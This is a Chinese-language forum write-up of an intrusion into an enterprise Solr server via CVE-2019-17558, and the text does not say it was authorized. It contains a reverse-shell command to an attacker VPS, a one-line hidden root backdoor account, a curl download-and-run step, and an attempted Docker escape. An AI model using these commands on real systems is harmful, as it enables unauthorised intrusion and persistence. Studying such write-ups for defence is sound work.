> 0x01 前言

日常日站,在测试某企业的时候扫描器突然发生反应,发现个solr,一个偶然让本不写文章的菜鸡开始写人生中第一篇文章

> 0x02 前戏

看了看solr的版本

[![](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-c34b251fd974a7a42010ba3b4c5bb915a494fe4e.png)](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-c34b251fd974a7a42010ba3b4c5bb915a494fe4e.png)

正好之前研究过一段时间的solr的一些rce,挨个试试

[![](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-8f0a844121f34a6d5988c1780f72ee1f751b563b.jpg)](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-8f0a844121f34a6d5988c1780f72ee1f751b563b.jpg)

在一顿操作后,啪的一下很快哈,找到一个`CVE-2019-17558`可以利用

> 0x03 命令执行

尝试使用CVE-2019-17558脚本执行命令

[![](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-0130d54ed10054e2c07f03f2e2217c5c68a8e1de.jpg)](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-0130d54ed10054e2c07f03f2e2217c5c68a8e1de.jpg)

运气爆棚直接就是root权限,我自己都不明白为啥是root

兴奋之极赶紧反弹shell呀

` bash -i >& /dev/tcp/xx.xx.169.148/1234 0>&1 `

[![](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-83632636a08faa20c7eb1c5d5d3f8097c3b454cb.jpg)](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-83632636a08faa20c7eb1c5d5d3f8097c3b454cb.jpg)

报错500,当时我就懵逼了

看了看自己的vps,发现啥反应都没有,估计是poc不支持,换了好几个都没用,咋办呀

很快哈,看一下ssh开了没,开了的话直接创个用户直接连上去不就行了  
[![](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-3d34669275eaab2d63099232d647fcc9487f38d7.jpg)](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-3d34669275eaab2d63099232d647fcc9487f38d7.jpg)

开了,开搞,一句话创建用户设置密码并给root权限

` useradd -p 0`openssl passwd -1 -salt 'abc' cqrdpass` -u 0  -o -g root -G root -s /bin/bash -d /usr/bin/cqrd cqrd `

看一下/etc/passwd

[![](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-7f45e5a959d5a0606f56dc2c4adbcf27ee70a1b7.jpg)](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-7f45e5a959d5a0606f56dc2c4adbcf27ee70a1b7.jpg)

但是....

连接的时候我直接去世

[![](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-5e88abd5d0835b745431fe16466c9e06ea911269.jpg)](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-5e88abd5d0835b745431fe16466c9e06ea911269.jpg)

去查了一下发现是设置过ssh配置文件,这可咋整

[![](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-c4beb158d97f2bf7575c4c2518a64e6969ab4e0c.jpg)](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-c4beb158d97f2bf7575c4c2518a64e6969ab4e0c.jpg)

我决定在试试反弹shell

> 0x04 再次尝试

这次换一种方法,直接在vps上的web下载到本地

` curl xx.xx.169.148/123.sh -o 123.sh `

爆了500

[![](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-103185ca002d640b9a21944dc3879b9641b9963e.jpg)](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-103185ca002d640b9a21944dc3879b9641b9963e.jpg)

看一下目录

[![](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-71f0571a92f36725b3827f96e2e51bac1b555807.jpg)](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-71f0571a92f36725b3827f96e2e51bac1b555807.jpg)

ohhhh,上传上去了

然后就是

给权限

执行

` bash ./123.sh `  
[![](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-4b93de57b7d8ffecaba0f5717fe41301937408be.jpg)](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-4b93de57b7d8ffecaba0f5717fe41301937408be.jpg)  
当我执行第二个命令的时候我又去世了  
[![](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-af546d68d14bc4d1461f7709eec54f624d8f1cc3.jpg)](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-af546d68d14bc4d1461f7709eec54f624d8f1cc3.jpg)  
居然是docker,试试`CVE-2019-5736`  
使用go编译  
[![](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-a261c8ca3ecbfda713b40e053adc67b458ac9790.jpg)](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-a261c8ca3ecbfda713b40e053adc67b458ac9790.jpg)  
发现可以,但是...然后呢?  
![rTNxXT.gif](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-7734837f84098871ab1958d989431a9166be81e7.gif)  
仔细一看发现需要别人启动才会触发

![rTUbDO.md.gif](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-1ecbefbc3d1e03cf58130a10fb98d1b6cc8a7c7d.gif)

这一等就是一天,发现什么鬼都没弹,还时不时的被别的ip访问而断开

于是我决定,不搞了收工  
[![](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-bcb760be6d214591003a436e98e01c557c5490b6.jpg)](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-bcb760be6d214591003a436e98e01c557c5490b6.jpg)

> 结语

感觉这一次实战学习到了很多,期间还试过jsp码子上到webapp上面链接,但是发现不行,发现22端口那个ssh有可能是主机的ssh,还是有很多的问题没有解决,我还是需要多多学习,告辞